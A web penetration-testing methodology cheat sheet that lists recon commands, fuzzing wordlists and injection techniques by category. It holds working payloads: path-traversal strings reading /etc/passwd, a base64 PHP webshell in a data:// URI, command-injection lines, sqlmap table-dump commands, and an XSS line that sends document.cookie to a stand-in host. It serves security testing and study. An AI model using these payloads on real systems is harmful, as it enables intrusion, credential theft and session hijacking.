# Tools
- cURL (CLI HTTP client)
- BurpSuite (HTTP proxy, scanner)
- BurpSuite extensions :  AuthMatrix (testing IDOR w/ PwnFox), PwnFox.jar (https://github.com/B-i-t-K/PwnFox), ParamMiner (+ SecLists/Discovery/Web-Content/Burpsuite-ParamMiner/lowercase-headers ), Logger++, DOMinvader w/ Burp Alpha version 
- nmap (network scanner)
- dirb/wfuzz/fuff (ressources fuzzing/bruteforce)
- SecLists : https://github.com/danielmiessler/SecLists (Discovery/Web-Content/raft-medium-files.txt & Discovery/Web-Content/raft-medium-directories.txt for web ressources finding ; Passwords/richelieu-french-top20000.txt for french passwords)
- PwnFox (Firefox containers to test for IDOR)  
- Wappalyzer (identifies web application technologies)  


# METHODOLOGY
## 1 - OSINT/Recon 
**Ping**  
	`$ ping www.site.com` 
	
**WHOIS**  
	`$ whois www.site.com`  
	`$ whois <ip>`  
	
**Google dorks**  
	- Search for credentials  
	`"intext:<thetarget> AND intext:@gmail.com AND intext:password"`   
	- Tools : FastGoogleDorks, theharvester  
	
**DNS**  
	- Check for information in the DNS records  
	`$ dig domain.com ANY`  
	`PS> nslookup -q=TXT domain.com`  
	- AXFR zone transfert 
	
**VHOSTS**  
HTTP "Host" header modification or "/etc/hosts" file modification (on local network) to access potential VHOST hosted on the same server
`wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.horizontall.htb" --sc 200 -u http://10.10.11.105/`  

**Subdomains enumeration**  
	`$ amass enum -passive -d domain.com -src` 
	
**Network scan**  
	`$ nmap -sV -A -p- -oA fichier_out site.com`\
	`-sV : Service detection`\
	`-A : OS detection + services`\
	`-p- : Targetting all system ports (-p1-1000 for fast scan on ports 1 to 1000)`\
	`-oA : output file`

**WAF detection**  
	Tool : `wafw00f`

 
## 2 - Client-side source code
**Application components information**  
CMS & libraries outdated versions ; file disclosure(.js files) ; unsafe cross-domain include


## 3 - Server config
Information gathering & vuln identifier: 
https://github.com/codingo/Reconnoitre
 

### URL: 
**Unprotected references/directory listing**  
- Find unprotected refs such as /admin/, robots.txt, sitemap.xml, etc.  
`$ dirb https://www.site.com/ /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt -o dirb_site.txt`
- Good wordlists : `raft-medium-files.txt` & `raft-medium-directories.txt`   

**Backup files**  
Find backup files extension and directories  
`/dev/`, `index.php~`, `/.git/`, `index.php.bak`, `index.php.old`, `.phps`, `.swp`, `etc.`

**Full Path Disclosure**  
Include an array in some parameters to trigger a verbose error from PHP functions  
`/index.php?file[]=1`
https://www.owasp.org/index.php/Full_Path_Disclosure]

**Redirections**\
  `$ curl -v `


### REQUESTS:
- Test HTTP headers (Are the header values reflected somewhere ? Can we inject something ?)
- Test HTTP methods (TRACE, PUT, DELETE, OPTIONS)
- HTTP verb tampering to bypass .htacces : HTTP request with a custom method : `$ curl -X YOLO http://www.site.com`  

- Dangerous functions : `eval() : NodeJS eval() payloads : res.end(require('fs').readFileSync('/etc/passwd').toString())` ; `preg_replace()+e modifier` ; `assert()` ; `include()`...
- PHP type juggling `loose comparison`, `strcmp(array())`, `magic hashes`
- Vulnerables packages ex:phpbb (can be identified by Wappalyzer or manually) `www.exemple.com/phpbb/install/...` 


## 4 - Authentication
**Session Cookie/token**
- Cookie : Is it randomly generated ? Is it possible to guess it to impersonate a user ?
- JWT attacks : None algorithm header change, signature algorithm bypass, bruteforce of the secret  
**IDOR/User partitioning**
- `PwnFox` : Is it possible to replay requests with an unprivileged user (IDOR, etc.) ? privesc ? lateral move ?
- `AuthMatrix`    

**CSRF**  
- 3 rules :
	1. There is an action within the application that the attacker has a reason to cause  
	2. The authentication system is only based on session cookies  
	3. There is no impredictible element in the request verified on the server-side  
-> Generate CSRF PoC Burp free extension 
- CSRF form example  


## 5 - Injections & inputs sanitizing
### SERVER SIDE:
- Check PayloadAllTheThings ( https://github.com/swisskyrepo/PayloadsAllTheThings )  

**File inclusion**  
- Basic payload : `?f=../../etc/passwd`  
- Check file iclusion filters such as :   
`?inc=php://filter/read=convert.base64-encode/resource=`  
`http://example.com/index.php?page=../../../etc/passwd%00` (Null byte)  
`http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd` (Double encoding)  
- Check file inclusion wrappers such as :  
Wrapper php://filter/ : `http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php`  
Wrapper data:// : `http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=`  
- LFI to RCE : try PHP code injection from Apache logs : Request GET /<?php phpinfo(); ?> then include the /var/log/apache2/access.log file
- Try to pass arrays as arguments for request parameters, some PHP functions may give verbose errors (ex strcmp(), include(), etc.)
Escaping : CRLF `%0A`, NULL BYTE`%00`, Php truncation `a/../admin.html/./.[x4096]././././`  
 
**Path traversal**  
- Search for parameters pointing to a file within the application  
- Tool : DotDotPwn  

**SQL injection**   
- Authentication SQLi
[authentification(classic,gbk=å‘µ' or 1=1 #, \xbf\x27), string(identify columns number with ' UNION SELECT NULL,NULL,NULL, numÃ©rique, SQLmap]\
SQLi method :\
	If format like "id=1" -> integer-based injection\
	If format like "username=toto" -> string-based injection

	1 - Target the field of the request\
	2 - Find if it is string-based or integer-based\
	3 - Try to trigger an error\
	4 - Try to fallback on the default payload by modifying it\

[sqlmap -u "http://testsite.com/login.php" --dbs]\
[sqlmap -u "http://lesite.com/index.php" --data "username=login&password=pass" -D site_db --tables]\
[sqlmap -u "http://lesite.com/index.php" --data "username=login&password=pass" -D site_db -T users --dump]\
order by : column numbers\
Error based : convert(), file_name()...\

**Command injection**  
`original_cmd_by_server; ls`  
`original_cmd_by_server && ls`  
`original_cmd_by_server | ls`  
`original_cmd_by_server || ls`    Only if the first cmd fail  
Command execution inside a command :  
`original_cmd_by_server `cat /etc/passwd` `    
`original_cmd_by_server $(cat /etc/passwd)`    

**XPATH injection**    
Similar to SQLi, basic payloads :     
`' or '1'='1`  
`' or ''='`    
`x' or 1=1 or 'x'='y`    
`/`  
`//`    
`//*`    
`*/*`    
`@*`    
  
**Template injection**  
Basic payload : `${2*2}`  
Template injection cheatsheet : http://leperche.space/images/template_injection.png 

**LDAP injection**  
(&(uid=*))(userPassword=*)(&))  

**SSRF**  
- Is it possible to read files from a URI ? Using protocols ``<file://>``; ``<gopher://>``, etc.
- Is the webapp interacting with a cloud server ? (ex REST requests to AWS ``http://169.254.169.254/`` )
- Is the webapp interacting with internal REST interfaces or internal database HTTP interfaces (ex : MongoDB, etc.) ?  

**XSLT code execution**  
exemple :  
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">  
<xsl:template match="/">  
<xsl:value-of select="php:function('file_get_contents','index.php')"/>  
<xsl:value-of select="php:function('opendir','/directory/')"/>  
<xsl:value-of select="php:function('chdir','/directory/')"/>  
<xsl:value-of select="php:function('readdir')"/>  
</xsl:template>  
</xsl:stylesheet>  


**XXE (XML External Entity)**  
exemple dans un flux rss :   
TODO 

**GraphQL injection**  
- query={__schema{types{name,fields{name}}}} to enumerate 

**FILE UPLOAD**  
- Double extension [.php.jpg]
- Type MIME modification : change Content-Type : "application/x-php" to "image/gif", "image/png", "image/jpeg"
- Null byte  
.php%00.jpg
.php\x00.jpg
- Magic bytes file signature(ex : add GIF89a in the beginning of the file for .gif)
- Upload a .htaccess file to interpret jpg as php files. .htaccess content : `AddType application/x-httpd-php .jpg`
- zip + lien symbolique (zip --symlinks test.zip lien, avec ln -s /etc/passwd lien) 


### CLIENT SIDE:
**XSS**  
- Analyze how user inputs are sanitized by the application and try to escape the sanitizing 
- Small #XSS list for manual testing (main cases, high success rate) from @brutelogic :   
`"><img src onerror=alert(1)>` (bypass 'script' tag)    
`<body onload="alert()">` (bypass 'script' tag)  
`"autofocus onfocus=alert(1)//`  
`</script><script>alert(1)</script>`  
`'-alert(1)-'`  
`\'-alert(1)//` (JSON backslash escape)  
`javascript:alert(1)`  
`<script>document.location.replace("http://endpoint?cookie=".concat(document.cookie))</script>`  (Get cookie from another user)    
Try it on : URL query, fragment & path and all input fields. 
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection  
- Check for DOM XSS by looking for Javascript sources & sinks in the code : 
 	Sources such as : `searchParams.get('param')`, `document.URL`, `location`, `document.cookie`, etc.    
	Document-related sinks such as : `document.write()`, `element.innerHTML`, etc.  
	Location-based sinks such as : `window.location`, `document.location`, etc.  
	Execution-based sinks such as : `eval()`, `toString()`, etc.  


## 6 - Encryption protocols & ciphers
- testssl.sh : weak ciphersuites/protocols ?


## NETWORK =
- DNS zone transfert may be possible if there is a misconfig : [dig @SERVEURDNS -p *port* AXFR *domaine*]
- LDAP null bind [ldapsearch -x -h *ldap.server* -p *port* -s base -b '' "(objectClass=*)" "*" +]


# Exploitation
- Reverse shell : pentestmonkey php reverse shell
